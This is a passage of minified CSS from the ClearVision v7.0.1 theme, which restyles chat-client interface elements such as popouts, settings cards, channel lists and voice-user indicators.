by ClearVision Team */.visual-refresh .contentWrapper__08434{background:var(--hsl-popout-shading);border:none}.visual-refresh .inspector_aeaaeb{background:rgba(0,0,0,0);border:none}.visual-refresh .navButton__08434{border-radius:5px}.visual-refresh .navButton__08434:hover{background:var(--background-modifier-accent)}.visual-refresh .navButtonActive__08434{background:var(--hsl-main-color)}.visual-refresh .navButtonActive__08434:hover{background:var(--hsl-main-color)}.visual-refresh .emojiPickerHasTabWrapper_c0e32c :is(.emojiPicker_c0e32c,.header_c0e32c){background:rgba(0,0,0,0)}.visual-refresh .wrapper__14245{background:hsl(from var(--hsl-main-color) h s l/0.8);margin-bottom:10px;border-radius:4px}.visual-refresh .wrapper__14245::after{height:0}.visual-refresh .searchBar_c0e32c{margin-right:12px}.visual-refresh :is(.emojiPicker_c0e32c,.header_c0e32c){background:var(--hsl-popout-shading);border:none}.visual-refresh .header__8ef02{background:rgba(0,0,0,0)}.visual-refresh .packHeader_e94b8c{margin-left:-8px;margin-bottom:10px}.visual-refresh .container_fed6d3,.visual-refresh .header_fed6d3{background:rgba(0,0,0,0);border:none}.emojiItem_fc7141.emojiItemSelected_fc7141{background:var(--background-modifier-accent)}.stickerInspected_c6367b .inspectedIndicator_c6367b{background:var(--background-modifier-accent)}.categoryFadeBlurple_d02962{background:hsl(from var(--hsl-main-color) h s l/0.8)}.categoryFadeBlurple_d02962,.categoryFadeBlurple_d02962:hover{border:none}.categoryFade_d02962{border:none}.categoryFade_d02962:hover{border:2px solid var(--hsl-main-color)}.categoryItemDefaultCategorySelected_b9ee0c,.categoryItemDefaultCategorySelected_b9ee0c:hover{background:var(--hsl-main-color)}.stickerCategoryGenericSelected__3ad28,.stickerCategoryGenericSelected__3ad28:hover,.firstPartyCategorySelected__3ad28,.firstPartyCategorySelected__3ad28:hover{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .messagesPopoutWrap__45690{background:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header__45690,.visual-refresh .footer__45690{background:rgba(0,0,0,0)}.visual-refresh .messageGroupWrapper__45690{background:var(--background-modifier-accent);border:none}.visual-refresh .jumpButton__45690{background:var(--hsl-main-color);border-color:rgba(0,0,0,0);color:var(--interactive-active)}.visual-refresh .jumpButton__45690:hover{background:var(--hsl-hover-color);color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__55c99{background:var(--hsl-popout-shading);border:none}.queryContainer__55c99{background:rgba(0,0,0,0)}.option__56fec:hover{background-color:var(--hsl-hover-color)}.option__56fec:hover :is(.filter__56fec,.answer__56fec,.plusIcon__56fec){color:var(--interactive-active)}.option__56fec:hover :is(.searchResultChannelIcon__56fec,.searchResultChannelCategory__56fec){opacity:1}.option__56fec:hover strong{color:var(--interactive-active)}.option__56fec[aria-selected=true]{background-color:var(--hsl-hover-color);box-shadow:none}.option__56fec[aria-selected=true] :is(strong,.plusIcon__56fec){color:var(--interactive-active)}.datePicker__56fec .datePickerHint__56fec .hintValue__56fec{background:var(--hsl-main-color);padding:0 5px}.calendarPicker_d27f17 .react-datepicker,.calendarPicker_d27f17 .react-datepicker__header{background:rgba(0,0,0,0)}.calendarPicker_d27f17 .react-datepicker__current-month{color:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .calendarPicker_d27f17 .react-datepicker__day-name{color:var(--header-primary)}.calendarPicker_d27f17 .react-datepicker__month{border:1px solid var(--hsl-main-color);background:var(--hsl-card-shading);border-radius:4px}.calendarPicker_d27f17 .react-datepicker__day.react-datepicker__day--selected::after{background:var(--hsl-main-color)}.calendarPicker_d27f17 .react-datepicker__day:is(.react-datepicker__day--keyboard-selected,.react-datepicker__day--selected:hover,:hover){background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .calendarPicker_d27f17 .react-datepicker__day:is(.react-datepicker__day--disabled,.react-datepicker__day--disabled:hover){background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .browser_d98031{background-color:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header_d9c882{background:rgba(0,0,0,0)}.visual-refresh .container__6764b{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.visual-refresh .container__6764b:hover{background:var(--background-modifier-accent);border:2px solid var(--hsl-hover-color)}.icon__1b24f{background:var(--hsl-main-color);color:var(--header-primary)}.popout__76f04{background-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.contentWrapper__9c62c{background:var(--hsl-popout-shading);box-shadow:none}.sectionRowsContentContainer__927fc{gap:8px}.container_cb32c7{background:var(--background-modifier-accent)}.container_cb32c7:hover{background:var(--hsl-card-shading);box-shadow:0 0 0 2px var(--hsl-hover-color)}.rowContainer_cb32c7,.rowContainer_cb32c7:first-child,.rowContainer_cb32c7:last-child{border-radius:8px}.rowDivider_cb32c7{background:rgba(0,0,0,0)}.container__7bdb0{background:rgba(0,0,0,0)}.overviewContainerNoVideo__95856,.overviewContainerWithVideo__95856{background:rgba(0,0,0,0)}.commandContainer_c94584{gap:8px;background:rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584{border:2px solid rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584:not(:last-child){border:2px solid rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584:not(:last-child):hover{border-color:var(--hsl-hover-color)}.commandContainer_c94584 :is(.command_c94584,.command_c94584:first-child,.command_c94584:last-child){border-radius:8px}.command_c94584{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.command_c94584:hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.sectionContentContainer_b18295{display:flex;flex-direction:column;background:rgba(0,0,0,0);gap:8px}.clickable__761e5{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.clickable__761e5:hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.clickable__761e5,.clickable__761e5:first-child,.clickable__761e5:last-child{border-radius:8px}.underline__761e5{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.picker__09f65,.picker__09f65.refresh__09f65){background:var(--hsl-popout-shading)}.visual-refresh .soundButtonWrapper__9be63{background:rgba(0,0,0,0)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63){background-color:var(--background-modifier-accent)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63):is(:hover,:focus-within,.focused__9be63){border-color:var(--hsl-main-color)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63):is(:hover,:focus-within,.focused__9be63).hoverActiveBackground__9be63{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .popoutContainer__0f481{background:var(--hsl-popout-shading);box-shadow:none;-webkit-backdrop-filter:none;backdrop-filter:none}.guildSection_d5cd2d{background:rgba(0,0,0,0)}.containerBackground_d4ced7{background:var(--hsl-popout-shading);border:none}.containerBackground_d4ced7::after{border-top-color:var(--hsl-popout-shading)}.contentWarningPopout_be95d0{background:var(--hsl-popout-shading);box-shadow:none}:is(.theme-dark,.theme-light) .footer_be95d0{background:rgba(0,0,0,0)}.spinnerContainer__86bf6{background:var(--hsl-popout-shading)}.visual-refresh .streamPreview__6da2d{background:var(--hsl-popout-shading)}.previewContainer__6da2d{background:rgba(0,0,0,0)}:is(.theme-dark,.theme-light) .watchButton__6da2d{border-color:var(--hsl-main-color)}:is(.theme-dark,.theme-light) .watchButton__6da2d:not([disabled]):hover{border-color:var(--hsl-hover-color)}.container__4e30a{background:var(--hsl-popout-shading)}.visual-refresh .container_b1bfd4{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.full-motion .translate_faf9c0{transform:unset !important}.user-profile-popout:not(.custom-user-profile-theme)::before{content:"""";position:absolute;width:100%;height:100%;background:var(--user-popout-image) var(--user-popout-position)/var(--user-popout-size) no-repeat;background-attachment:var(--user-popout-attachment);filter:var(--user-popout-filter);z-index:-1}.user-profile-modal:not(.custom-user-profile-theme)::before{content:"""";position:absolute;width:100%;height:100%;background:var(--user-modal-image) var(--user-modal-position)/var(--user-modal-size) no-repeat;background-attachment:var(--user-modal-attachment);filter:var(--user-modal-filter);z-index:-1}.outer_c0bea0:not(.custom-user-profile-theme){background:var(--hsl-background-shading)}.outer_c0bea0:not(.custom-user-profile-theme) .inner_c0bea0{background:rgba(0,0,0,0)}.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609{background:var(--hsl-popout-shading)}.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609::before,.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609::after{display:none}.outer_c0bea0:not(.custom-user-profile-theme) .inner_ab8609{background:rgba(0,0,0,0)}.overlay_c0bea0{background-color:var(--hsl-card-shading)}.note_fcb628 .textarea__9daae{border:none;background:var(--hsl-input-shading)}.note_fcb628 .textarea__9daae:focus{background:var(--hsl-input-shading)}.visual-refresh .custom-user-profile-theme .inlineContainer__74017{background:var(--user-profile-note-background-focus);box-shadow:0 0 0 2px var(--user-profile-border)}.visual-refresh .custom-user-profile-theme .inlineContainer__74017:focus-within{box-shadow:0 0 2px 2px var(--profile-gradient-primary-color)}.visual-refresh .custom-user-profile-theme .top_b3f026 .item_b3f026{--selected-tab-item-color: var(--profile-gradient-secondary-color)}.visual-refresh .custom-user-profile-theme .top_b3f026 .item_b3f026.selected_b3f026{--selected-tab-item-color: var(--profile-gradient-primary-color)}.custom-user-profile-theme ::-webkit-scrollbar-thumb{background-color:var(--profile-gradient-primary-color)}.custom-user-profile-theme .textarea__9daae{background:var(--user-profile-note-background-focus)}.custom-user-profile-theme .textarea__9daae:focus{box-shadow:0 0 2px 2px var(--profile-gradient-primary-color);background:var(--user-profile-note-background-focus)}.user-profile-sidebar:not(.custom-user-profile-theme){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}/*! ClearVision v7.0.1 by ClearVision Team */.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6{border-radius:4px;position:relative}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleRemoveButton_dfa8b6{position:static}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleRemoveIcon_dfa8b6{left:12px}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleCircle__4f569::before{content:"""";top:-1px;right:-1px;bottom:-1px;left:-1px;position:absolute;background:inherit;opacity:.2;border-radius:4px}.background__4f569{fill:none}.dotBorderBase__4f569{fill:none}.dotBorderColor__4f569{opacity:1}.visual-refresh .container__3dde2{background:var(--hsl-popout-shading);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.mask__44b0c rect[fill*=""#82838b""]{fill:var(--hsl-offline-color)}.mask__44b0c rect[fill*=""#43a25a""]{fill:var(--hsl-online-color)}.mask__44b0c rect[fill*=""#ca9654""]{fill:var(--hsl-idle-color)}.mask__44b0c rect[fill*=""#d83a42""]{fill:var(--hsl-dnd-color)}.mask__44b0c rect[fill*=""#9147ff""]{fill:var(--hsl-streaming-color)}/*! ClearVision v7.0.1 by ClearVision Team */.layer__960e4{background-color:rgba(0,0,0,0)}.contentRegion__23e6b{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .contentRegionScroller__23e6b{background:rgba(0,0,0,0)}.contentColumnDefault__23e6b{padding-top:50px}.visual-refresh .container_fcf29c{background:var(--hsl-popout-shading);border:none}.visual-refresh .cardPrimary__73069,.visual-refresh .cardPrimary__73069.editable__73069{background:var(--hsl-card-shading);border-color:rgba(0,0,0,0)}.card__73069 a{color:var(--hsl-main-color)}.card_b846e5::before{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.container__6cd3a,.clickableContainer__6cd3a{background:rgba(0,0,0,0)}.visual-refresh .backgroundModifierContainer__6cd3a{background:var(--hsl-card-shading);border-top-color:rgba(0,0,0,0);border-left-color:rgba(0,0,0,0);border-bottom-color:rgba(0,0,0,0)}.visual-refresh .backgroundModifierContainer__6cd3a:is(:hover,:active):not(.disabled__6cd3a):not(.noAction__6cd3a){background:var(--hsl-card-shading)}.visual-refresh .backgroundModifierContainer__6cd3a.selected__6cd3a{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.visual-refresh .selected__6cd3a.statusGreen__6cd3a{border-color:var(--status-positive)}.visual-refresh .selected__6cd3a.statusYellow__6cd3a{border-color:var(--status-warning)}.visual-refresh .selected__6cd3a.statusOrange__6cd3a{border-color:var(--orange-360)}.visual-refresh .selected__6cd3a.statusRed__6cd3a{border-color:var(--status-danger)}.visual-refresh .collapseable__217b7,.visual-refresh .collapseable__217b7:active{background:var(--hsl-card-shading);border:none}.default_e18686,.default_e18686:hover{background-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .standardSidebarView__23e6b{background:rgba(0,0,0,0)}.visual-refresh .sidebarRegionScroller__23e6b{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3));padding:20px 8px 60px 20px}/*! ClearVision v7.0.1 by ClearVision Team */.selectedBackground_e681d1{background:rgba(0,0,0,0)}.accountProfileCard__1fed1{background:var(--hsl-card-shading)}.badgeList__1fed1,.background__1fed1,.fieldList__1fed1{background:rgba(0,0,0,0)}.visual-refresh .container_d878e7{background:rgba(0,0,0,0)}.avatarBackground_eb2508{background:rgba(0,0,0,0)}.option__54675{background:var(--background-modifier-accent)}.option__54675:hover{border:2px solid var(--hsl-main-color)}.card__5cea9{background:var(--hsl-card-shading)}.header__5cea9{background:rgba(0,0,0,0)}.visual-refresh .box_f8c98c{background:var(--hsl-card-shading);border:none}.row__0624f{background:var(--background-modifier-accent);border:none}.authedAppV2__50a54{background:var(--hsl-card-shading)}.headerV2__50a54{background:rgba(0,0,0,0)}.appDetailsContainer__50a54{background:rgba(0,0,0,0)}.appDetailsContainer__50a54 .appDetailsSection__50a54{background:var(--background-modifier-accent);padding:16px}.appDetailsContainer__50a54 .appDetailsSection__50a54:active{background:var(--background-modifier-accent)}.appDetailsContainer__50a54 .appDetailsSection__50a54:first-child{border-radius:8px 8px 0 0}.appDetailsContainer__50a54 .appDetailsSection__50a54:nth-child(2){border-radius:0 0 8px 8px}.actionMenuButton_d84e0f{background:var(--background-modifier-accent)}.sessionIcon__803f2{background:var(--hsl-main-color);color:var(--header-primary)}.connectContainer_c7f964,.connection_c7f964{background:var(--hsl-card-shading)}.connectionsContainer_c7f964{justify-content:center}.accountButtonInner_c7f964,.accountBtnInner__750de{background-color:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.accountButtonInner_c7f964:hover,.accountBtnInner__750de:hover{background-color:var(--background-modifier-accent);border-color:var(--hsl-main-color)}.connectionHeader_c7f964{background:rgba(0,0,0,0);padding-bottom:0}.metadataContainer_c7f964{background-color:var(--background-modifier-accent)}.perkCard_b62c4e{background:var(--hsl-card-shading)}.innerWrapperBase__70f7f{background:var(--hsl-popout-shading)}.subButton__70f7f{color:var(--hsl-main-color) !important}.giftButton_b322b1:hover{background:rgba(0,0,0,0)}.giftCard_a45ed3{background:var(--hsl-card-shading)}.guildContainer__5dba5,.boostContainer_ceb06a{background:var(--hsl-card-shading)}.appliedBoostContainer_ceb06a{background:rgba(0,0,0,0)}.detailsBlock_e335a7{background:var(--hsl-card-shading)}.paymentPane__01014{background:var(--hsl-card-shading)}.paginator__01014,.payment_e9cb00{background:rgba(0,0,0,0)}.expandedInfo_e9cb00{background:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .hoverablePayment_e9cb00:hover{background:rgba(0,0,0,0)}:is(.theme-light,.theme-dark) .bottomDivider__01014{border-bottom-color:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .codeRedemptionRedirect_a706ba{background:var(--hsl-card-shading);border:none}.container__06283{-webkit-mask-image:url(https://clearvision.github.io/icons/pill.svg);mask-image:url(https://clearvision.github.io/icons/pill.svg);background:var(--hsl-main-color) !important}:is(.theme-light,.theme-dark) .progress__06283{background:var(--hsl-background-shading)}.notches__06283{display:none}:is(.theme-light,.theme-dark) .sliderBar_ac7648{background-color:var(--background-modifier-accent)}.soundButtonSettingContainer__84bad{background:var(--hsl-card-shading)}.cameraWrapper_d41d5f{background:var(--hsl-card-shading);border:none}.backgroundOptionRing__53965{border:2px solid var(--hsl-main-color)}.notDetected_cc46f0{background:var(--hsl-card-shading)}.nowPlaying_cc46f0{background:hsl(from ""color.success"" h s l/0.8)}.addGamePopout_cc46f0{background:var(--hsl-popout-shading);box-shadow:none}:is(.theme-light,html:not(.theme-dark)) .game_cc46f0{box-shadow:0 1px 0 0 var(--background-modifier-accent)}.expandedContainer__9d98d,.groupHeader__9d98d,.groupCollapsedContainer__9d98d,.groupContainer__9d98d{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.settingCard__1a4ef,.settingCard__1a4ef.active__1a4ef{background:var(--hsl-card-shading)}.cardFolder__1a4ef{background:rgba(0,0,0,0)}.scroller__53543{background:rgba(0,0,0,0)}.container_d5ae15{background:var(--hsl-popout-shading)}.header_d5ae15{background:var(--hsl-input-shading)}.group__344e6{border-color:var(--background-modifier-accent)}.item__344e6{background:var(--hsl-card-shading);cursor:pointer}.item__344e6.selected__344e6{background-color:hsl(from var(--hsl-main-color) h s l/0.4)}.deny__344e6{color:var(--hsl-danger-color);border-right:1px solid var(--background-modifier-accent)}.deny__344e6.selected__344e6{background-color:hsl(from var(--hsl-danger-color) h s l/0.6)}.allow__344e6{color:var(--hsl-success-color);border-left:1px solid var(--background-modifier-accent)}.allow__344e6.selected__344e6{background-color:hsl(from var(--hsl-success-color) h s l/0.6)}/*! ClearVision v7.0.1 by ClearVision Team */.itemSelected_ec9088{border:2px solid var(--hsl-main-color)}.traitContainer__4cbea{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.traitContainer__4cbea:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.emojiWrapper__4cbea{border:none;padding-left:10px}.traitInput__4cbea{background:rgba(0,0,0,0);box-shadow:none;height:32px}.traitInput__4cbea:focus-within{box-shadow:none}.wrapper__83b1d,.wrapper__83b1d:hover{background:rgba(0,0,0,0)}.action__83b1d{background:var(--hsl-popout-shading)}.mainTableContainer_fa2640{background:var(--hsl-card-shading)}.visual-refresh .container_d8f25b{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .container_d8f25b:hover{background:var(--hsl-card-shading);border:2px solid var(--hsl-main-color)}.icon_d8f25b{background:var(--hsl-main-color);color:var(--interactive-active)}.circleButton__5f97b{margin-left:10px}.roleRow__5f97b:hover:not(.roleRowDisableHover__5f97b) .circleButton__5f97b{background:var(--hsl-card-shading)}.roleRow__5f97b:hover:not(.roleRowDisableHover__5f97b) .circleButton__5f97b:hover{background:var(--hsl-main-color)}.titleContainer_e29cd7{background:rgba(0,0,0,0)}.header_c6bf1b{background:rgba(0,0,0,0);transition:background .15s ease-in-out}.stickyHeaderElevated_c6bf1b{background:var(--hsl-popout-shading)}.container__09ccc{background:var(--hsl-popout-shading)}.joinOptions__959cb{background:var(--hsl-card-shading)}.joinOptionContent__959cb.active__959cb{background:var(--background-modifier-accent)}.visual-refresh .changelog_abe1fa,.visual-refresh .safetyChecklist_eae0ef,.visual-refresh .simpleItemWrapper__5dac8{background:var(--hsl-card-shading);border:none}.valuePill__5dac8{background:var(--hsl-card-shading);border:1px solid var(--hsl-main-color)}.visual-refresh .auditLog__43dab{background:var(--hsl-card-shading);border:none}.visual-refresh :is(.headerExpanded__43dab,.divider__43dab,.changeDetails__43dab){background:rgba(0,0,0,0)}.visual-refresh .scrollerContainer_cdb2b0{background:var(--hsl-card-shading);border:none}.textBadge__0034b{border-color:rgba(0,0,0,0)}.visual-refresh .editCard_a25a68{background:var(--hsl-card-shading);border:none}.visual-refresh :is(.mentionLimitContainer_ed9c90,.keywordListContainer__09e76,.actionContainer__6446f){background:var(--background-modifier-accent)}.visual-refresh .keywordsTextArea__6a631{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .keywordsTextArea__6a631:focus{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.actionContainer_bc4513,.stepCountIcon_b6c6eb{background:var(--background-modifier-accent)}.stepperContainer_ed9c90{background:rgba(0,0,0,0);border:none}.textArea_c615b7{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.textArea_c615b7:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.guildDetails_bebc5b{background:var(--hsl-popout-shading)}.featureCard_bebc5b{background:var(--hsl-card-shading)}.featureIcon_bebc5b{background:rgba(0,0,0,0)}.visual-refresh .upsellContainer__4cfe2{background:var(--hsl-card-shading)}.visual-refresh .upsellFooter__4cfe2{background:rgba(0,0,0,0)}.howItWorksContainer_dd30dc{background:rgba(0,0,0,0);padding:0}.howItWorksImageContainer_dd30dc{background:rgba(0,0,0,0)}.card_fc2e20{background:var(--hsl-card-shading)}.avatarCard__02e4c{background:var(--background-modifier-accent)}:is(.verticalConnector__02e4c,.horizontalConnector__02e4c){border-color:var(--background-modifier-accent) !important}.viewServerButton__2485e{background:var(--hsl-main-color)}.viewServerButton__2485e:hover{background:var(--hsl-hover-color)}.visual-refresh .tier_f15dca{border:none}.visual-refresh .tierHeader_f15dca,.visual-refresh .tierBody_f15dca{background:var(--hsl-card-shading);border:none}.descriptionBox__981f7{background:var(--hsl-card-shading)}.developerPortalCtaWrapper_bf485f{background:rgba(0,0,0,0)}.analyticsCard__5931c{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .panels_c48ade{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5));border-radius:0;border:none;width:100%;left:0;bottom:0;padding:8px}:is(.theme-light,.theme-dark) .panel__5dec7{background-color:rgba(0,0,0,0)}.visual-refresh .button_e131a9.buttonColor_e131a9{background:var(--hsl-main-color)}.visual-refresh .button_e131a9.buttonColor_e131a9:hover{background:var(--hsl-hover-color)}.visual-refresh .button_e131a9.buttonColor_e131a9.buttonActive_e131a9{background:hsl(from var(--hsl-main-color) h s l/0.4);color:var(--button-secondary-text);border-color:hsl(from var(--hsl-main-color) h s l/0.2)}.visual-refresh .button_e131a9.buttonColor_e131a9.buttonActive_e131a9:hover{background:hsl(from var(--hsl-hover-color) h s l/0.3)}.noiseCancellationPopout_e131a9{background:var(--hsl-popout-shading)}:is(.theme-light,.theme-dark) .wrapper__0d616{background:rgba(0,0,0,0)}.contentWrapper__0d616{background:none !important}.postEnrollmentBackgroundCollapsed__636a2,.postEnrollmentBackgroundExpanded__636a2{background-image:none !important;background-color:rgba(0,0,0,0);border:none}.headerText__636a2,.submenuIcon__636a2{color:rgba(0,0,0,0)}.contentInteractable__636a2 .postEnrollmentBackgroundExpanded__636a2{background-color:var(--hsl-popout-shading)}.contentInteractable__636a2 .headerText__636a2{color:var(--text-normal)}.contentInteractable__636a2 .submenuIcon__636a2{color:var(--interactive-normal)}/*! ClearVision v7.0.1 by ClearVision Team */.keyboard-mode .focusStroke_cc5dd2{stroke:var(--focus-color);stroke-width:4px}.visual-refresh .guilds_c48ade{margin-bottom:var(--custom-app-panels-height);background:rgba(0,0,0,0);padding-top:10px}.item__58105{box-shadow:0 0 3px 1px var(--hsl-main-color)}.pill__5bc7e{bottom:0}.visual-refresh .childWrapper__6e9f8{background-color:var(--hsl-card-shading)}.visual-refresh .childWrapper__6e9f8>svg{width:100%;height:100%;background:var(--home-icon) center/var(--home-size) no-repeat}.visual-refresh .childWrapper__6e9f8 path{display:none}.wrapper__6e9f8:hover .childWrapper__6e9f8{background-color:var(--hsl-hover-color)}.wrapper__6e9f8.selected__6e9f8 .childWrapper__6e9f8{background-color:var(--hsl-main-color)}.icon__6e9f8{background-color:var(--hsl-card-shading)}.visual-refresh .expandedFolderBackground__48112{background:var(--hsl-card-shading)}.circleIconButton__5bc7e{background-color:var(--hsl-card-shading)}.circleIconButton__5bc7e.selected__5bc7e{background:var(--hsl-main-color)}.visual-refresh .circleIconButton__5bc7e:hover:not(.disabled__5bc7e){background:var(--hsl-hover-color)}.mention__3b95d{background:var(--hsl-main-color);border-radius:5px}.mention__3b95d:active{background:var(--hsl-main-color)}.iconBadge__2b1f5{background:var(--hsl-popout-shading)}.iconBadge__2b1f5.isCurrentUserConnected__650eb{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapperCommon__29444 .mainContent__29444 .name__29444{flex:1}.visual-refresh .name__29444{display:flex;align-items:center;justify-content:center;color:var(--hsl-main-color);font-weight:700}.visual-refresh .name__29444::before{content:"""";height:2px;flex-grow:1;transition:all .3s ease-in-out;background:linear-gradient(to left, var(--hsl-main-color) 50%, transparent);margin-right:5px}.visual-refresh .name__29444::after{content:"""";height:2px;flex-grow:1;transition:all .3s ease-in-out;background:linear-gradient(to right, var(--hsl-main-color) 50%, transparent);margin-left:5px}.visual-refresh .children__29444{margin-left:6px}.visual-refresh .addButtonIcon__29444{color:var(--hsl-main-color)}.collapsed__29444 .name__29444::before,.collapsed__29444 .name__29444::after{flex-grow:0}.wrapper__29444.muted__29444 :is(.name__29444,.addButtonIcon__29444){color:var(--hsl-main-color);opacity:.5}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444{color:var(--hsl-hover-color)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444::before{background:linear-gradient(to left, var(--hsl-hover-color) 50%, transparent)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444::after{background:linear-gradient(to right, var(--hsl-hover-color) 50%, transparent)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .addButtonIcon__29444{color:var(--hsl-hover-color)}.icon__29444{display:none}/*! ClearVision v7.0.1 by ClearVision Team */.newChannel__599fa{background:var(--hsl-main-color) !important;color:var(--header-primary)}.visual-refresh .sidebarList_c48ade{margin-bottom:var(--custom-app-panels-height);border-top-left-radius:10px;border:none;-webkit-backdrop-filter:none;backdrop-filter:none}.visual-refresh .container__2637a{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2));padding:0}.visual-refresh .animatedContainer_f37cb1{background-color:rgba(0,0,0,0);border:none}.visual-refresh .unread__2ea32{box-shadow:0 0 6px 1px var(--hsl-main-color)}.visual-refresh .bottom__7aaec,.visual-refresh .unreadBottom__629e4{bottom:8px}.visual-refresh .bar__7aaec,.visual-refresh .bar__3b95d{background-color:var(--hsl-main-color);border-color:var(--hsl-main-color)}.visual-refresh .unreadIcon__7aaec,.visual-refresh .barText__7aaec{color:var(--button-filled-brand-text) !important}.spineBorder__5b40b{background-color:var(--hsl-main-color)}.spine__5b40b{color:var(--hsl-main-color)}.link__2ea32{transition:all .15s ease-in-out;margin-left:4px}.link__2ea32::before{top:0;right:100%;bottom:0;left:0;transition:all .15s ease-in-out;z-index:-1;border-radius:4px}.icon__2ea32{width:18px;height:18px;margin-right:3px;transition:all .15s ease-in-out;color:var(--hsl-channel-normal)}.name__2ea32{transition:all .15s ease-in-out;color:var(--hsl-channel-normal)}.wrapper__2ea32.modeMuted__2ea32 .name__2ea32,.wrapper__2ea32.modeMuted__2ea32 .icon__2ea32{color:var(--hsl-channel-muted)}.wrapper__2ea32:hover .link__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .link__2ea32{background:var(--background-modifier-accent)}.wrapper__2ea32:hover .name__2ea32,.wrapper__2ea32:hover .icon__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .name__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .icon__2ea32{color:var(--hsl-channel-hover)}.wrapper__2ea32.modeUnreadImportant__2ea32 .name__2ea32{color:var(--hsl-channel-unread);text-shadow:0 0 3px}.wrapper__2ea32.modeUnreadImportant__2ea32 .icon__2ea32{color:var(--hsl-channel-unread);filter:drop-shadow(0 0 3px)}.wrapper__2ea32.modeUnreadImportant__2ea32:hover :is(.name__2ea32,.icon__2ea32){color:var(--hsl-channel-unread-hover)}.wrapper__2ea32.modeSelected__2ea32 .link__2ea32{background-color:rgba(0,0,0,0)}.wrapper__2ea32.modeSelected__2ea32 .link__2ea32::before{right:0;background:var(--hsl-channel-selected-bg);animation:cv-channel-select .3s ease-in-out}.wrapper__2ea32.modeSelected__2ea32 .name__2ea32,.wrapper__2ea32.modeSelected__2ea32 .icon__2ea32{color:var(--hsl-channel-selected)}.wrapper__2ea32.modeConnected__2ea32 .name__2ea32{color:var(--hsl-main-color);text-shadow:0 0 3px}.wrapper__2ea32.modeConnected__2ea32 .icon__2ea32{color:var(--hsl-main-color);filter:drop-shadow(0 0 3px)}.visual-refresh .wrapper__260e1,.visual-refresh .users__260e1{background:rgba(0,0,0,0)}.visual-refresh .users__260e1{padding:0 8px 0 6px}.visual-refresh .total__260e1{padding:0 6px 0 1px}.list_c3cd7d{padding-left:24px}.voiceUser__07f91{z-index:1}.voiceUser__07f91 .content__07f91{border-radius:3px;transition:all .15s ease-in-out}.voiceUser__07f91 .avatarSpeaking__07f91{box-shadow:0 0 0 2px var(--hsl-main-color),inset 0 0 3px rgba(0,0,0,.5);position:relative;transition:all .1s ease-in-out}.voiceUser__07f91 .avatarSpeaking__07f91:after{content:"""";top:-2px;bottom:-2px;width:150px;position:absolute;height:1.8em;background:linear-gradient(to right, var(--hsl-main-color) 10%, transparent);opacity:.5;transition:all .1s ease-in-out,width .15s 